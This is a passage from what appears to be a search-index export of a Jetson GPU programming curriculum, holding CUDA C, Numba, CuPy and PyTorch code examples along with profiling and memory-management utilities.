int col = bx * 16 + tx;\n\n    float sum = 0.0f;\n\n    for (int k = 0; k &lt; (N + 15) / 16; k++) {\n        // Load data into shared memory\n        if (row &lt; N &amp;&amp; k * 16 + tx &lt; N)\n            As[ty][tx] = A[row * N + k * 16 + tx];\n        else\n            As[ty][tx] = 0.0f;\n\n        if (col &lt; N &amp;&amp; k * 16 + ty &lt; N)\n            Bs[ty][tx] = B[(k * 16 + ty) * N + col];\n        else\n            Bs[ty][tx] = 0.0f;\n\n        __syncthreads();\n\n        // Compute partial sum\n        for (int i = 0; i &lt; 16; i++) {\n            sum += As[ty][i] * Bs[i][tx];\n        }\n\n        __syncthreads();\n    }\n\n    if (row &lt; N &amp;&amp; col &lt; N) {\n        C[row * N + col] = sum;\n    }\n}\n\nint main() {\n    const int N = 1024;\n    const int size = N * sizeof(float);\n\n    // Host memory allocation\n    std::vector&lt;float&gt; h_A(N), h_B(N), h_C(N);\n\n    // Initialize data\n    for (int i = 0; i &lt; N; i++) {\n        h_A[i] = static_cast&lt;float&gt;(i);\n        h_B[i] = static_cast&lt;float&gt;(i * 2);\n    }\n\n    // Device memory allocation\n    float *d_A, *d_B, *d_C;\n    cudaMalloc(&amp;d_A, size);\n    cudaMalloc(&amp;d_B, size);\n    cudaMalloc(&amp;d_C, size);\n\n    // Copy data to device\n    cudaMemcpy(d_A, h_A.data(), size, cudaMemcpyHostToDevice);\n    cudaMemcpy(d_B, h_B.data(), size, cudaMemcpyHostToDevice);\n\n    // Launch kernel\n    int threadsPerBlock = 256;\n    int blocksPerGrid = (N + threadsPerBlock - 1) / threadsPerBlock;\n\n    auto start = std::chrono::high_resolution_clock::now();\n    vectorAdd&lt;&lt;&lt;blocksPerGrid, threadsPerBlock&gt;&gt;&gt;(d_A, d_B, d_C, N);\n    cudaDeviceSynchronize();\n    auto end = std::chrono::high_resolution_clock::now();\n\n    auto duration = std::chrono::duration_cast&lt;std::chrono::microseconds&gt;(end - start);\n    std::cout &lt;&lt; \"Kernel execution time: \" &lt;&lt; duration.count() &lt;&lt; \" microseconds\" &lt;&lt; std::endl;\n\n    // Copy result back\n    cudaMemcpy(h_C.data(), d_C, size, cudaMemcpyDeviceToHost);\n\n    // Verify result\n    bool success = true;\n    for (int i = 0; i &lt; N; i++) {\n        if (abs(h_C[i] - (h_A[i] + h_B[i])) &gt; 1e-5) {\n            success = false;\n            break;\n        }\n    }\n\n    std::cout &lt;&lt; \"Test \" &lt;&lt; (success ? \"PASSED\" : \"FAILED\") &lt;&lt; std::endl;\n\n    // Cleanup\n    cudaFree(d_A);\n    cudaFree(d_B);\n    cudaFree(d_C);\n\n    return 0;\n}\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#compilation-and-execution","title":"Compilation and Execution","text":"<pre><code># Compile CUDA code\nnvcc -o vector_add vector_add.cu -arch=sm_87  # For Jetson Orin\nnvcc -o vector_add vector_add.cu -arch=sm_72  # For Jetson Xavier NX\n\n# Run the program\n./vector_add\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#advanced-cuda-features","title":"Advanced CUDA Features","text":"<pre><code>// streams_example.cu - Asynchronous execution with CUDA streams\n#include &lt;cuda_runtime.h&gt;\n#include &lt;iostream&gt;\n\n__global__ void kernel(float* data, int N) {\n    int idx = blockIdx.x * blockDim.x + threadIdx.x;\n    if (idx &lt; N) {\n        data[idx] = sqrtf(data[idx] * data[idx] + 1.0f);\n    }\n}\n\nint main() {\n    const int N = 1024 * 1024;\n    const int nStreams = 4;\n    const int streamSize = N / nStreams;\n    const int streamBytes = streamSize * sizeof(float);\n\n    // Allocate pinned host memory for faster transfers\n    float* h_data;\n    cudaMallocHost(&amp;h_data, N * sizeof(float));\n\n    // Initialize data\n    for (int i = 0; i &lt; N; i++) {\n        h_data[i] = static_cast&lt;float&gt;(i);\n    }\n\n    // Allocate device memory\n    float* d_data;\n    cudaMalloc(&amp;d_data, N * sizeof(float));\n\n    // Create streams\n    cudaStream_t streams[nStreams];\n    for (int i = 0; i &lt; nStreams; i++) {\n        cudaStreamCreate(&amp;streams[i]);\n    }\n\n    // Launch kernels asynchronously\n    for (int i = 0; i &lt; nStreams; i++) {\n        int offset = i * streamSize;\n\n        // Async memory copy H2D\n        cudaMemcpyAsync(&amp;d_data[offset], &amp;h_data[offset], streamBytes,\n                       cudaMemcpyHostToDevice, streams[i]);\n\n        // Launch kernel\n        kernel&lt;&lt;&lt;streamSize/256, 256, 0, streams[i]&gt;&gt;&gt;(&amp;d_data[offset], streamSize);\n\n        // Async memory copy D2H\n        cudaMemcpyAsync(&amp;h_data[offset], &amp;d_data[offset], streamBytes,\n                       cudaMemcpyDeviceToHost, streams[i]);\n    }\n\n    // Wait for all streams to complete\n    for (int i = 0; i &lt; nStreams; i++) {\n        cudaStreamSynchronize(streams[i]);\n        cudaStreamDestroy(streams[i]);\n    }\n\n    std::cout &lt;&lt; \"Streams execution completed\" &lt;&lt; std::endl;\n\n    // Cleanup\n    cudaFreeHost(h_data);\n    cudaFree(d_data);\n\n    return 0;\n}\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#numba-python-cuda-jit","title":"\ud83d\udc0d Numba (Python CUDA JIT)","text":"<p>Numba allows writing Python functions that compile to GPU code via LLVM and CUDA backend, providing near-native performance with Python syntax.</p>"},{"location":"curriculum/my_01c_accelerated_computing/#basic-numba-cuda","title":"\u2705 Basic Numba CUDA","text":"<pre><code>from numba import cuda\nimport numpy as np\nimport time\n\n@cuda.jit\ndef add_kernel(a, b, out):\n    i = cuda.grid(1)\n    if i &lt; a.size:\n        out[i] = a[i] + b[i]\n\nN = 1024\nA = np.ones(N, dtype=np.float32)\nB = np.ones(N, dtype=np.float32)\nOUT = np.zeros(N, dtype=np.float32)\n\nadd_kernel[32, 32](A, B, OUT)\nprint(\"GPU sum[0]:\", OUT[0])\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#advanced-numba-features","title":"\u2705 Advanced Numba Features","text":""},{"location":"curriculum/my_01c_accelerated_computing/#shared-memory-optimization","title":"Shared Memory Optimization","text":"<pre><code>from numba import cuda, float32\nimport numpy as np\nimport math\n\n@cuda.jit\ndef matrix_mul_shared(A, B, C):\n    \"\"\"\n    Matrix multiplication using shared memory for better performance\n    \"\"\"\n    # Define shared memory arrays\n    sA = cuda.shared.array(shape=(16, 16), dtype=float32)\n    sB = cuda.shared.array(shape=(16, 16), dtype=float32)\n\n    # Thread and block indices\n    tx = cuda.threadIdx.x\n    ty = cuda.threadIdx.y\n    bx = cuda.blockIdx.x\n    by = cuda.blockIdx.y\n\n    # Calculate global thread position\n    row = by * cuda.blockDim.y + ty\n    col = bx * cuda.blockDim.x + tx\n\n    # Initialize accumulator\n    tmp = 0.0\n\n    # Loop over tiles\n    for k in range(math.ceil(A.shape[1] / 16)):\n        # Load data into shared memory\n        if row &lt; A.shape[0] and k * 16 + tx &lt; A.shape[1]:\n            sA[ty, tx] = A[row, k * 16 + tx]\n        else:\n            sA[ty, tx] = 0.0\n\n        if col &lt; B.shape[1] and k * 16 + ty &lt; B.shape[0]:\n            sB[ty, tx] = B[k * 16 + ty, col]\n        else:\n            sB[ty, tx] = 0.0\n\n        # Synchronize threads\n        cuda.syncthreads()\n\n        # Compute partial dot product\n        for i in range(16):\n            tmp += sA[ty, i] * sB[i, tx]\n\n        # Synchronize before loading next tile\n        cuda.syncthreads()\n\n    # Write result\n    if row &lt; C.shape[0] and col &lt; C.shape[1]:\n        C[row, col] = tmp\n\n# Example usage\ndef benchmark_matrix_multiplication():\n    N = 512\n    A = np.random.random((N, N)).astype(np.float32)\n    B = np.random.random((N, N)).astype(np.float32)\n    C = np.zeros((N, N), dtype=np.float32)\n\n    # GPU computation\n    d_A = cuda.to_device(A)\n    d_B = cuda.to_device(B)\n    d_C = cuda.to_device(C)\n\n    # Configure grid and block dimensions\n    threads_per_block = (16, 16)\n    blocks_per_grid_x = math.ceil(N / threads_per_block[0])\n    blocks_per_grid_y = math.ceil(N / threads_per_block[1])\n    blocks_per_grid = (blocks_per_grid_x, blocks_per_grid_y)\n\n    # Warm up\n    matrix_mul_shared[blocks_per_grid, threads_per_block](d_A, d_B, d_C)\n    cuda.synchronize()\n\n    # Benchmark\n    start_time = time.time()\n    matrix_mul_shared[blocks_per_grid, threads_per_block](d_A, d_B, d_C)\n    cuda.synchronize()\n    gpu_time = time.time() - start_time\n\n    # Copy result back\n    result = d_C.copy_to_host()\n\n    # CPU comparison\n    start_time = time.time()\n    cpu_result = np.dot(A, B)\n    cpu_time = time.time() - start_time\n\n    print(f\"GPU time: {gpu_time:.4f}s\")\n    print(f\"CPU time: {cpu_time:.4f}s\")\n    print(f\"Speedup: {cpu_time/gpu_time:.2f}x\")\n    print(f\"Results match: {np.allclose(result, cpu_result, rtol=1e-3)}\")\n\nbenchmark_matrix_multiplication()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#memory-management-and-streams","title":"Memory Management and Streams","text":"<pre><code>from numba import cuda\nimport numpy as np\n\n@cuda.jit\ndef compute_kernel(data, result, N):\n    \"\"\"Complex computation kernel\"\"\"\n    idx = cuda.grid(1)\n    if idx &lt; N:\n        # Simulate complex computation\n        temp = data[idx]\n        for i in range(100):  # Intensive computation\n            temp = temp * 1.01 + 0.001\n        result[idx] = temp\n\ndef async_processing_example():\n    \"\"\"Demonstrate asynchronous processing with streams\"\"\"\n    N = 1024 * 1024\n    num_streams = 4\n    chunk_size = N // num_streams\n\n    # Allocate pinned memory for faster transfers\n    data = cuda.pinned_array(N, dtype=np.float32)\n    result = cuda.pinned_array(N, dtype=np.float32)\n\n    # Initialize data\n    data[:] = np.random.random(N).astype(np.float32)\n\n    # Create streams\n    streams = [cuda.stream() for _ in range(num_streams)]\n\n    # Allocate device memory\n    d_data = cuda.device_array(N, dtype=np.float32)\n    d_result = cuda.device_array(N, dtype=np.float32)\n\n    start_time = time.time()\n\n    # Process chunks asynchronously\n    for i in range(num_streams):\n        start_idx = i * chunk_size\n        end_idx = min((i + 1) * chunk_size, N)\n        current_chunk_size = end_idx - start_idx\n\n        with streams[i]:\n            # Copy data to device\n            d_data[start_idx:end_idx] = data[start_idx:end_idx]\n\n            # Launch kernel\n            threads_per_block = 256\n            blocks_per_grid = (current_chunk_size + threads_per_block - 1) // threads_per_block\n            compute_kernel[blocks_per_grid, threads_per_block](\n                d_data[start_idx:end_idx], \n                d_result[start_idx:end_idx], \n                current_chunk_size\n            )\n\n            # Copy result back\n            result[start_idx:end_idx] = d_result[start_idx:end_idx]\n\n    # Wait for all streams to complete\n    for stream in streams:\n        stream.synchronize()\n\n    total_time = time.time() - start_time\n    print(f\"Async processing completed in {total_time:.4f}s\")\n    print(f\"Throughput: {N / total_time / 1e6:.2f} M elements/sec\")\n\nasync_processing_example()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#performance-profiling-with-numba","title":"Performance Profiling with Numba","text":"<pre><code>from numba import cuda\nimport numpy as np\nimport time\nfrom contextlib import contextmanager\n\n@contextmanager\ndef cuda_timer():\n    \"\"\"Context manager for timing CUDA operations\"\"\"\n    start = cuda.event()\n    end = cuda.event()\n\n    start.record()\n    yield\n    end.record()\n    end.wait()\n\n    elapsed_time = cuda.event_elapsed_time(start, end)\n    print(f\"CUDA operation took: {elapsed_time:.4f} ms\")\n\n@cuda.jit\ndef reduction_kernel(data, partial_sums):\n    \"\"\"Parallel reduction using shared memory\"\"\"\n    # Shared memory for this block\n    shared = cuda.shared.array(256, dtype=cuda.float32)\n\n    tid = cuda.threadIdx.x\n    bid = cuda.blockIdx.x\n    idx = bid * cuda.blockDim.x + tid\n\n    # Load data into shared memory\n    if idx &lt; data.size:\n        shared[tid] = data[idx]\n    else:\n        shared[tid] = 0.0\n\n    cuda.syncthreads()\n\n    # Perform reduction in shared memory\n    stride = cuda.blockDim.x // 2\n    while stride &gt; 0:\n        if tid &lt; stride:\n            shared[tid] += shared[tid + stride]\n        cuda.syncthreads()\n        stride //= 2\n\n    # Write result for this block\n    if tid == 0:\n        partial_sums[bid] = shared[0]\n\ndef optimized_reduction(data):\n    \"\"\"Optimized parallel reduction\"\"\"\n    threads_per_block = 256\n    blocks_per_grid = (data.size + threads_per_block - 1) // threads_per_block\n\n    # Allocate memory for partial sums\n    partial_sums = cuda.device_array(blocks_per_grid, dtype=np.float32)\n\n    with cuda_timer():\n        reduction_kernel[blocks_per_grid, threads_per_block](data, partial_sums)\n\n        # Final reduction on CPU (small array)\n        host_partial = partial_sums.copy_to_host()\n        final_sum = np.sum(host_partial)\n\n    return final_sum\n\n# Performance comparison\nN = 10**7\ndata = np.random.random(N).astype(np.float32)\nd_data = cuda.to_device(data)\n\nprint(\"Performance Comparison:\")\nprint(\"-\" * 40)\n\n# CPU reduction\nstart_time = time.time()\ncpu_sum = np.sum(data)\ncpu_time = time.time() - start_time\nprint(f\"CPU sum: {cpu_sum:.6f} (Time: {cpu_time:.4f}s)\")\n\n# GPU reduction\ngpu_sum = optimized_reduction(d_data)\nprint(f\"GPU sum: {gpu_sum:.6f}\")\nprint(f\"Speedup: {cpu_time / 0.001:.2f}x\")  # Approximate GPU time\nprint(f\"Results match: {abs(cpu_sum - gpu_sum) &lt; 1e-3}\")\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#installation-and-setup","title":"\ud83d\udc33 Installation and Setup","text":"<pre><code># Install Numba with CUDA support\npip install numba\n\n# Verify CUDA support\npython -c \"from numba import cuda; print('CUDA available:', cuda.is_available())\"\n</code></pre> <p>Ensure container is run with <code>--runtime=nvidia</code></p>"},{"location":"curriculum/my_01c_accelerated_computing/#advanced-optimization-techniques","title":"\ud83d\ude80 Advanced Optimization Techniques","text":""},{"location":"curriculum/my_01c_accelerated_computing/#performance-profiling-and-analysis","title":"\ud83d\udcca Performance Profiling and Analysis","text":""},{"location":"curriculum/my_01c_accelerated_computing/#nvidia-nsight-systems-integration","title":"NVIDIA Nsight Systems Integration","text":"<pre><code>import subprocess\nimport os\nfrom contextlib import contextmanager\n\n@contextmanager\ndef nsight_profile(output_file=\"profile.nsys-rep\"):\n    \"\"\"Context manager for NVIDIA Nsight Systems profiling\"\"\"\n    # Start profiling\n    cmd = f\"nsys start --output={output_file}\"\n    subprocess.run(cmd.split(), check=True)\n\n    try:\n        yield\n    finally:\n        # Stop profiling\n        subprocess.run([\"nsys\", \"stop\"], check=True)\n        print(f\"Profile saved to: {output_file}\")\n        print(f\"View with: nsys-ui {output_file}\")\n\n# Example usage with profiling\ndef profile_gpu_workload():\n    \"\"\"Example of profiling GPU workload\"\"\"\n    from numba import cuda\n    import numpy as np\n\n    @cuda.jit\n    def compute_intensive_kernel(data, result, iterations):\n        idx = cuda.grid(1)\n        if idx &lt; data.size:\n            temp = data[idx]\n            for i in range(iterations):\n                temp = temp * 1.1 + 0.01\n            result[idx] = temp\n\n    N = 1024 * 1024\n    data = np.random.random(N).astype(np.float32)\n    result = np.zeros(N, dtype=np.float32)\n\n    d_data = cuda.to_device(data)\n    d_result = cuda.to_device(result)\n\n    threads_per_block = 256\n    blocks_per_grid = (N + threads_per_block - 1) // threads_per_block\n\n    with nsight_profile(\"gpu_workload.nsys-rep\"):\n        # Multiple kernel launches for profiling\n        for i in range(10):\n            compute_intensive_kernel[blocks_per_grid, threads_per_block](\n                d_data, d_result, 100\n            )\n            cuda.synchronize()\n\n# profile_gpu_workload()  # Uncomment to run profiling\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#custom-performance-metrics","title":"Custom Performance Metrics","text":"<pre><code>import time\nimport psutil\nimport GPUtil\nfrom dataclasses import dataclass\nfrom typing import List, Dict\nimport json\n\n@dataclass\nclass PerformanceMetrics:\n    \"\"\"Container for performance metrics\"\"\"\n    execution_time: float\n    gpu_utilization: float\n    gpu_memory_used: float\n    gpu_memory_total: float\n    cpu_utilization: float\n    system_memory_used: float\n    power_consumption: float = 0.0\n    temperature: float = 0.0\n\nclass JetsonPerformanceProfiler:\n    \"\"\"Comprehensive performance profiler for Jetson devices\"\"\"\n\n    def __init__(self):\n        self.metrics_history: List[PerformanceMetrics] = []\n        self.gpu = GPUtil.getGPUs()[0] if GPUtil.getGPUs() else None\n\n    def get_current_metrics(self) -&gt; PerformanceMetrics:\n        \"\"\"Capture current system metrics\"\"\"\n        # GPU metrics\n        gpu_util = self.gpu.load * 100 if self.gpu else 0.0\n        gpu_mem_used = self.gpu.memoryUsed if self.gpu else 0.0\n        gpu_mem_total = self.gpu.memoryTotal if self.gpu else 0.0\n\n        # CPU and system metrics\n        cpu_util = psutil.cpu_percent(interval=0.1)\n        memory = psutil.virtual_memory()\n\n        # Jetson-specific metrics (if available)\n        power = self._get_power_consumption()\n        temp = self._get_temperature()\n\n        return PerformanceMetrics(\n            execution_time=0.0,  # Will be set by context manager\n            gpu_utilization=gpu_util,\n            gpu_memory_used=gpu_mem_used,\n            gpu_memory_total=gpu_mem_total,\n            cpu_utilization=cpu_util,\n            system_memory_used=memory.used / (1024**3),  # GB\n            power_consumption=power,\n            temperature=temp\n        )\n\n    def _get_power_consumption(self) -&gt; float:\n        \"\"\"Get power consumption (Jetson-specific)\"\"\"\n        try:\n            # Try to read from Jetson power monitoring\n            with open('/sys/bus/i2c/drivers/ina3221x/1-0040/iio:device0/in_power0_input', 'r') as f:\n                return float(f.read().strip()) / 1000.0  # Convert to watts\n        except:\n            return 0.0\n\n    def _get_temperature(self) -&gt; float:\n        \"\"\"Get GPU temperature\"\"\"\n        try:\n            with open('/sys/class/thermal/thermal_zone1/temp', 'r') as f:\n                return float(f.read().strip()) / 1000.0  # Convert to Celsius\n        except:\n            return 0.0\n\n    @contextmanager\n    def profile(self, description: str = \"\"):\n        \"\"\"Context manager for profiling code execution\"\"\"\n        print(f\"Starting profiling: {description}\")\n\n        start_metrics = self.get_current_metrics()\n        start_time = time.time()\n\n        try:\n            yield self\n        finally:\n            end_time = time.time()\n            end_metrics = self.get_current_metrics()\n\n            # Calculate execution time\n            execution_time = end_time - start_time\n            end_metrics.execution_time = execution_time\n\n            self.metrics_history.append(end_metrics)\n\n            print(f\"Profiling completed: {description}\")\n            print(f\"Execution time: {execution_time:.4f}s\")\n            print(f\"GPU utilization: {end_metrics.gpu_utilization:.1f}%\")\n            print(f\"GPU memory: {end_metrics.gpu_memory_used:.1f}/{end_metrics.gpu_memory_total:.1f} MB\")\n            print(f\"CPU utilization: {end_metrics.cpu_utilization:.1f}%\")\n            if end_metrics.power_consumption &gt; 0:\n                print(f\"Power consumption: {end_metrics.power_consumption:.2f}W\")\n            if end_metrics.temperature &gt; 0:\n                print(f\"Temperature: {end_metrics.temperature:.1f}\u00b0C\")\n            print(\"-\" * 50)\n\n    def generate_report(self, filename: str = \"performance_report.json\"):\n        \"\"\"Generate detailed performance report\"\"\"\n        if not self.metrics_history:\n            print(\"No metrics collected yet.\")\n            return\n\n        # Calculate statistics\n        avg_exec_time = sum(m.execution_time for m in self.metrics_history) / len(self.metrics_history)\n        avg_gpu_util = sum(m.gpu_utilization for m in self.metrics_history) / len(self.metrics_history)\n        avg_cpu_util = sum(m.cpu_utilization for m in self.metrics_history) / len(self.metrics_history)\n\n        report = {\n            \"summary\": {\n                \"total_runs\": len(self.metrics_history),\n                \"average_execution_time\": avg_exec_time,\n                \"average_gpu_utilization\": avg_gpu_util,\n                \"average_cpu_utilization\": avg_cpu_util,\n            },\n            \"detailed_metrics\": [\n                {\n                    \"execution_time\": m.execution_time,\n                    \"gpu_utilization\": m.gpu_utilization,\n                    \"gpu_memory_used\": m.gpu_memory_used,\n                    \"cpu_utilization\": m.cpu_utilization,\n                    \"power_consumption\": m.power_consumption,\n                    \"temperature\": m.temperature\n                }\n                for m in self.metrics_history\n            ]\n        }\n\n        with open(filename, 'w') as f:\n            json.dump(report, f, indent=2)\n\n        print(f\"Performance report saved to: {filename}\")\n        return report\n\n# Example usage\ndef demonstrate_profiling():\n    \"\"\"Demonstrate comprehensive profiling\"\"\"\n    profiler = JetsonPerformanceProfiler()\n\n    # Profile different workloads\n    from numba import cuda\n    import numpy as np\n\n    @cuda.jit\n    def matrix_multiply_kernel(A, B, C):\n        row = cuda.blockIdx.y * cuda.blockDim.y + cuda.threadIdx.y\n        col = cuda.blockIdx.x * cuda.blockDim.x + cuda.threadIdx.x\n\n        if row &lt; C.shape[0] and col &lt; C.shape[1]:\n            temp = 0.0\n            for k in range(A.shape[1]):\n                temp += A[row, k] * B[k, col]\n            C[row, col] = temp\n\n    # Test different matrix sizes\n    sizes = [256, 512, 1024]\n\n    for size in sizes:\n        A = np.random.random((size, size)).astype(np.float32)\n        B = np.random.random((size, size)).astype(np.float32)\n        C = np.zeros((size, size), dtype=np.float32)\n\n        d_A = cuda.to_device(A)\n        d_B = cuda.to_device(B)\n        d_C = cuda.to_device(C)\n\n        threads_per_block = (16, 16)\n        blocks_per_grid_x = (size + threads_per_block[0] - 1) // threads_per_block[0]\n        blocks_per_grid_y = (size + threads_per_block[1] - 1) // threads_per_block[1]\n        blocks_per_grid = (blocks_per_grid_x, blocks_per_grid_y)\n\n        with profiler.profile(f\"Matrix multiplication {size}x{size}\"):\n            matrix_multiply_kernel[blocks_per_grid, threads_per_block](d_A, d_B, d_C)\n            cuda.synchronize()\n\n    # Generate comprehensive report\n    profiler.generate_report(\"matrix_multiply_performance.json\")\n\n# demonstrate_profiling()  # Uncomment to run\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#memory-optimization-strategies","title":"\u26a1 Memory Optimization Strategies","text":""},{"location":"curriculum/my_01c_accelerated_computing/#memory-pool-management","title":"Memory Pool Management","text":"<pre><code>from numba import cuda\nimport numpy as np\nfrom contextlib import contextmanager\n\nclass GPUMemoryPool:\n    \"\"\"GPU memory pool for efficient memory management\"\"\"\n\n    def __init__(self, initial_size_mb: int = 512):\n        self.pool_size = initial_size_mb * 1024 * 1024  # Convert to bytes\n        self.allocated_blocks = {}\n        self.free_blocks = []\n        self.total_allocated = 0\n\n        # Pre-allocate memory pool\n        self._initialize_pool()\n\n    def _initialize_pool(self):\n        \"\"\"Initialize the memory pool\"\"\"\n        try:\n            # Allocate large contiguous block\n            self.memory_pool = cuda.device_array(self.pool_size // 4, dtype=np.uint8)\n            print(f\"Initialized GPU memory pool: {self.pool_size // (1024*1024)} MB\")\n        except cuda.cudadrv.driver.CudaDriverError as e:\n            print(f\"Failed to allocate memory pool: {e}\")\n            self.memory_pool = None\n\n    @contextmanager\n    def allocate(self, size_bytes: int):\n        \"\"\"Allocate memory from pool\"\"\"\n        if self.memory_pool is None:\n            # Fallback to regular allocation\n            array = cuda.device_array(size_bytes // 4, dtype=np.uint8)\n            try:\n                yield array\n            finally:\n                del array\n            return\n\n        # Use memory pool (simplified implementation)\n        if size_bytes &lt;= self.pool_size - self.total_allocated:\n            start_idx = self.total_allocated // 4\n            end_idx = start_idx + size_bytes // 4\n            allocated_view = self.memory_pool[start_idx:end_idx]\n            self.total_allocated += size_bytes\n\n            try:\n                yield allocated_view\n            finally:\n                # In a real implementation, you'd track and reuse freed blocks\n                pass\n        else:\n            raise MemoryError(\"Insufficient memory in pool\")\n\n    def get_usage_stats(self):\n        \"\"\"Get memory pool usage statistics\"\"\"\n        used_mb = self.total_allocated / (1024 * 1024)\n        total_mb = self.pool_size / (1024 * 1024)\n        usage_percent = (self.total_allocated / self.pool_size) * 100\n\n        return {\n            \"used_mb\": used_mb,\n            \"total_mb\": total_mb,\n            \"usage_percent\": usage_percent\n        }\n\n# Example usage\ndef memory_pool_example():\n    \"\"\"Demonstrate memory pool usage\"\"\"\n    pool = GPUMemoryPool(256)  # 256 MB pool\n\n    @cuda.jit\n    def process_data(data, result):\n        idx = cuda.grid(1)\n        if idx &lt; data.size:\n            result[idx] = data[idx] * 2.0 + 1.0\n\n    # Process multiple batches using memory pool\n    batch_size = 1024 * 1024  # 1M elements\n    num_batches = 5\n\n    for batch in range(num_batches):\n        data = np.random.random(batch_size).astype(np.float32)\n\n        with pool.allocate(batch_size * 4) as gpu_data:  # 4 bytes per float32\n            with pool.allocate(batch_size * 4) as gpu_result:\n                # Copy data to GPU\n                gpu_data_view = gpu_data.view(np.float32)\n                gpu_result_view = gpu_result.view(np.float32)\n\n                gpu_data_view[:] = data\n\n                # Process data\n                threads_per_block = 256\n                blocks_per_grid = (batch_size + threads_per_block - 1) // threads_per_block\n                process_data[blocks_per_grid, threads_per_block](gpu_data_view, gpu_result_view)\n\n                # Copy result back\n                result = gpu_result_view.copy_to_host()\n\n                print(f\"Batch {batch + 1} processed. Pool usage: {pool.get_usage_stats()}\")\n\n# memory_pool_example()  # Uncomment to run\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#unified-memory-management","title":"Unified Memory Management","text":"<pre><code>from numba import cuda\nimport numpy as np\n\nclass UnifiedMemoryManager:\n    \"\"\"Manager for CUDA Unified Memory\"\"\"\n\n    @staticmethod\n    def allocate_unified(size, dtype=np.float32):\n        \"\"\"Allocate unified memory accessible from both CPU and GPU\"\"\"\n        # Note: This is a conceptual example\n        # Actual unified memory allocation depends on CUDA version and hardware\n        try:\n            # Allocate pinned memory for better performance\n            array = cuda.pinned_array(size, dtype=dtype)\n            return array\n        except:\n            # Fallback to regular numpy array\n            return np.zeros(size, dtype=dtype)\n\n    @staticmethod\n    def prefetch_to_gpu(array, device_id=0):\n        \"\"\"Prefetch unified memory to GPU\"\"\"\n        # This would use cudaMemPrefetchAsync in actual CUDA code\n        if hasattr(array, 'copy_to_device'):\n            return cuda.to_device(array)\n        return cuda.to_device(array)\n\n    @staticmethod\n    def prefetch_to_cpu(array):\n        \"\"\"Prefetch unified memory to CPU\"\"\"\n        # This would use cudaMemPrefetchAsync in actual CUDA code\n        if hasattr(array, 'copy_to_host'):\n            return array.copy_to_host()\n        return np.array(array)\n\ndef unified_memory_example():\n    \"\"\"Demonstrate unified memory usage patterns\"\"\"\n    manager = UnifiedMemoryManager()\n\n    # Allocate large dataset\n    N = 10 * 1024 * 1024  # 10M elements\n    data = manager.allocate_unified(N, dtype=np.float32)\n    data[:] = np.random.random(N).astype(np.float32)\n\n    @cuda.jit\n    def compute_statistics(data, mean_result, std_result):\n        \"\"\"Compute mean and standard deviation\"\"\"\n        idx = cuda.grid(1)\n\n        # Shared memory for reduction\n        shared_sum = cuda.shared.array(256, dtype=cuda.float32)\n        shared_sq_sum = cuda.shared.array(256, dtype=cuda.float32)\n\n        tid = cuda.threadIdx.x\n\n        # Initialize shared memory\n        shared_sum[tid] = 0.0\n        shared_sq_sum[tid] = 0.0\n\n        # Each thread processes multiple elements\n        elements_per_thread = (data.size + cuda.gridDim.x * cuda.blockDim.x - 1) // (cuda.gridDim.x * cuda.blockDim.x)\n\n        for i in range(elements_per_thread):\n            data_idx = idx + i * cuda.gridDim.x * cuda.blockDim.x\n            if data_idx &lt; data.size:\n                val = data[data_idx]\n                shared_sum[tid] += val\n                shared_sq_sum[tid] += val * val\n\n        cuda.syncthreads()\n\n        # Reduction in shared memory\n        stride = cuda.blockDim.x // 2\n        while stride &gt; 0:\n            if tid &lt; stride:\n                shared_sum[tid] += shared_sum[tid + stride]\n                shared_sq_sum[tid] += shared_sq_sum[tid + stride]\n            cuda.syncthreads()\n            stride //= 2\n\n        # Write block results\n        if tid == 0:\n            cuda.atomic.add(mean_result, 0, shared_sum[0])\n            cuda.atomic.add(std_result, 0, shared_sq_sum[0])\n\n    # Allocate result arrays\n    mean_result = cuda.device_array(1, dtype=np.float32)\n    std_result = cuda.device_array(1, dtype=np.float32)\n\n    # Initialize results\n    mean_result[0] = 0.0\n    std_result[0] = 0.0\n\n    # Prefetch data to GPU\n    gpu_data = manager.prefetch_to_gpu(data)\n\n    # Launch kernel\n    threads_per_block = 256\n    blocks_per_grid = min(32, (N + threads_per_block - 1) // threads_per_block)\n\n    compute_statistics[blocks_per_grid, threads_per_block](gpu_data, mean_result, std_result)\n    cuda.synchronize()\n\n    # Get results\n    mean_val = mean_result[0] / N\n    variance = (std_result[0] / N) - (mean_val ** 2)\n    std_val = np.sqrt(variance)\n\n    print(f\"GPU computed statistics:\")\n    print(f\"Mean: {mean_val:.6f}\")\n    print(f\"Std:  {std_val:.6f}\")\n\n    # Verify with CPU\n    cpu_mean = np.mean(data)\n    cpu_std = np.std(data)\n    print(f\"\\nCPU verification:\")\n    print(f\"Mean: {cpu_mean:.6f}\")\n    print(f\"Std:  {cpu_std:.6f}\")\n    print(f\"\\nDifference:\")\n    print(f\"Mean diff: {abs(mean_val - cpu_mean):.8f}\")\n    print(f\"Std diff:  {abs(std_val - cpu_std):.8f}\")\n\n# unified_memory_example()  # Uncomment to run\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#numpy-with-cupy-gpu-drop-in-replacement","title":"\ud83d\udcca NumPy with CuPy (GPU drop-in replacement)","text":"<p>CuPy mimics NumPy's API but uses CUDA arrays and streams.</p>"},{"location":"curriculum/my_01c_accelerated_computing/#cupy-example","title":"\u2705 CuPy Example","text":"<pre><code>import cupy as cp\n\nx = cp.arange(1000000).astype(cp.float32)\ny = cp.sin(x) ** 2 + cp.cos(x) ** 2\nprint(\"Sum:\", cp.sum(y))\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#in-container","title":"\ud83d\udc33 In Container","text":"<pre><code>pip install cupy-cuda11x  # Replace with correct Jetson CUDA version\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#pytorch-on-gpu","title":"\ud83d\udd25 PyTorch on GPU","text":"<p>Jetson comes with optimized PyTorch preinstalled in the NVIDIA container.</p>"},{"location":"curriculum/my_01c_accelerated_computing/#pytorch-matrix-multiplication","title":"\u2705 PyTorch Matrix Multiplication","text":"<pre><code>import torch\n\nA = 